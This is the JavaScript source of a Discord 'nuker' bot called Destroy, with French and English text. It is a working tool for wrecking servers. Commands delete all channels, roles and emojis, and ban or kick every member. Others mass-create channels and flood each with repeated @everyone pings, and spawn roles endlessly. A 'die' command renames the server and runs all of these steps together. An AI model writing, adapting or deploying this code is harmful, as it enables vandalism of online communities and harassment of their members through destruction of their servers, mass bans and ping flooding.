// https://github.com/HodesR
// Discord: Hodés#0007

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;

const presser = String.raw`

                             
                                       ▓█████▄ ▓█████   ██████ ▄▄▄█████▓ ██▀███   ▒█████ ▓██   ██▓
                                       ▒██▀ ██▌▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒██  ██▒
                                       ░██   █▌▒███   ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒ ▒██ ██░
                                       ░▓█▄   ▌▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░ ░ ▐██▓░
                                       ░▒████▓ ░▒████▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░ ░ ██▒▓░
                                        ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░   ██▒▒▒ 
                                        ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ▓██ ░▒░ 
                                        ░ ░  ░    ░   ░  ░  ░    ░        ░░   ░ ░ ░ ░ ▒  ▒ ▒ ░░  
                                           ░       ░  ░      ░              ░         ░ ░  ░ ░     
                                           ░                                                 ░ ░     

                                                            
                                                                      

                                        Author: HodesR

`;

console.log(red(presser));


client.on("ready", () => {
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log(redBright(`                                      Connecté en tant que: ${client.user.username}#${client.user.discriminator}`));
    console.log(redBright(`                                      Prefix: ${prefix}`));
    console.log(redBright(`                                      DisableEveryone: ${disableEveryone}`));
    console.log(redBright(`                                      Permission Obligatoire: ADMINISTRATOR`));
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity(`Exitium / Imperium`, { type: "STREAMING", url: "https://www.twitch.tv/hodesr" }); // Supp si tu veux 
});


client.on("message", async message => {

    if (message.author.bot) return;

    if (message.mentions.everyone === true) {
        return;
    } else if (message.mentions.has(client.user.id)) {
        const helpEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
            .setTitle('Destructeur: Destroy')
            .setDescription(`*Salut je suis Sadés.*\n\n **Pour Destroy:**\n
            **Mass Channel:** \`${prefix}cc\` [text]
            **Mass Channel & Ping Mass:** \`${prefix}mp\` [text]
            **Mass Roles:** \`${prefix}mr\` [text]
            **Delete All Channels:** \`${prefix}chd\`
            **Delete All Roles:** \`${prefix}dr\`
            **Delete All Emojis:** \`${prefix}emoall\`
            **Ban All Members:** \`${prefix}banall\`
            **Kick All Members:** \`${prefix}kall\`
            **Server Destroy:** \`${prefix}die\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`© Destroy | Prefix: ${prefix} | Author: HodesR | Cord: ${founder}`)
            .setColor(0x36393E)
            .setTimestamp(Date.now());
        message.channel.send(helpEmbed);
    }

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }

    // Help

    if (disableEveryone === false) {

        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('Destructeur: Destroy')
                .setDescription(`*Exitium et Imperium est ma raison.*\n\n **Destroy:**\n
                **Mass Channel:** \`${prefix}cc\` [text]
                **Mass Channel & Ping Mass:** \`${prefix}mp\` [text]
                **Mass Roles:** \`${prefix}mr\` [text]
                **Delete All Channels:** \`${prefix}chd\`
                **Delete All Roles:** \`${prefix}dr\`
                **Delete All Emojis:** \`${prefix}emoall\`
                **Ban All Members:** \`${prefix}banall\`
                **Kick All Members:** \`${prefix}kall\`
                **Server Destroy:** \`${prefix}die\` [text]
                `)
                .setImage(`https://cdn.discordapp.com/attachments/833673063273988146/846382127050391602/gzaaphy-min.gif`)
                .setFooter(`© Destructeur | Prefix: ${prefix} | Auteur: HodesR | Cord: ${founder}`)
                .setColor("#FF0000")
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
            message.delete();
        }

        // Mass Channels      

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create(argresult)
                        console.log(yellowBright(`CHANNEL MASSED!`))
                    }
                }
                message.delete();
            }
        }

        // Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('Destroy by ' + message.author.username)

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('Destroy by ' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone @here' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone @here ' + argresult);
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }


        // Mass Roles

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {
                    setInterval(function () {
                        var i = 0; i < 250;
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).then(console.log(yellow("ROLE BEING MASSED")))
                    }, 100) // 0.1 second
                }
                message.delete();
            }
        }

        // Channel Delete
        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                )); // deletes all channels
                message.delete();
            }
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ))
                message.delete();
            }
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ));
                message.delete();
            }
        }

        // Delete All Roles                 
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.roles.cache.forEach((role) => {
                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                })
                message.delete();
            }
        }

        // Delete All Emojis 
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} is being deleted successfully`))))
                message.delete();
            }
        }

        // Death.
        if (message.content.startsWith(prefix + 'die')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.delete();
                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://cdn.discordapp.com/attachments/846084182585507860/846386531933093938/dzdzdzdz.PNG') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "RANDOM"
                        }
                    }).then(console.log(yellow("ROLE BEING MASSED")))
                }, 100) // 0.1 second
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (disableEveryone === true) {

        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != myID) {
                return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
            }
            else {
                const helpEmbed = new Discord.MessageEmbed()
                    .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                    .setTitle('Destructeur: Destroy')
                    .setDescription(`*Exitium et Imperium est ma raison*\n\n **Destroy:**\n
                    **Mass Channel:** \`${prefix}cc\` [text]
                    **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                    **Mass Roles:** \`${prefix}mr\` [text]
                    **Delete All Channels:** \`${prefix}chd\`
                    **Delete All Roles:** \`${prefix}dr\`
                    **Delete All Emojis:** \`${prefix}emoall\`
                    **Ban All Members:** \`${prefix}banall\`
                    **Kick All Members:** \`${prefix}kall\`
                    **Server Destroy:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(``)
                    .setFooter(`© Destroy | Prefix: ${prefix} | Author: HodesR | Cord: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
            }
        }

        // Mass Channels      

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
                        let args = message.content.split(" ").slice(1);
                        var argresult = args.join(' ');
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create(argresult)
                            console.log(yellowBright(`CHANNEL MASSED!`))
                        }
                    }
                }
            }
        }

        // Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create('wizzed by ' + message.author.username)

                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone  @here ' + argresult)
                                            console.log(blueBright(`CHANNEL PINGED!`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }

                        }

                    }
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone @here' + argresult);
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
            }
        }
        // Mass Create Roles      

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
                        setInterval(function () {
                            var i = 0; i < 250;
                            message.guild.roles.create({
                                data: {
                                    name: `${argresult}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).then(console.log(yellow("ROLE BEING MASSED")))
                        }, 100) // 0.1 second
                    }
                }
            }
        }

        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.channels.cache.forEach(channel => channel.delete().then(
                        console.log(redBright(`CHANNEL FUCKED`))
                    )); // deletes all channels
                    message.delete();
                }
            }
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ))
                }
            }
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ));
                }
            }
        }

        // Delete All Roles All
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.roles.cache.forEach(r => r.delete({ reason: "Nuking" }).then(console.log(yellow(`ROLE: ${r.name} a été supprimé avec succès`))).catch(
                        console.log(yellow(`ROLE: ${r.name} ne peut pas être supprimé.`))
                    ));
                }
            }
        }

        // Delete All Emojis All
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} a été supprimé avec succès`))).catch(
                        console.log(yellow(`EMOJI: ${r.name} ne peut pas être supprimé.`))
                    ));
                }
            }
        }
    }

    // Death.
    if (message.content.startsWith(prefix + 'die')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
        } else {
            if (message.author.id != myID) {
                return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
            }
            else {
                message.delete();
                message.guild.setName(`Exitium / Imperium.`).then(console.log(green(`Le nom du serveur a été remplacé par : ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://cdn.discordapp.com/attachments/846084182585507860/846386531933093938/dzdzdzdz.PNG') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} est en cours de suppression avec succès`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Destroy" },).then(console.log(yellow(`EMOJI: ${e.name} a été supprimé avec succès`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Ajouter une entrée après le cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "#ff0000"
                        }
                    }).then(console.log(yellow("ROLE BEING MASSED")))
                }, 100) // 0.1 second
            }
        }
    }

})

client.login(token);
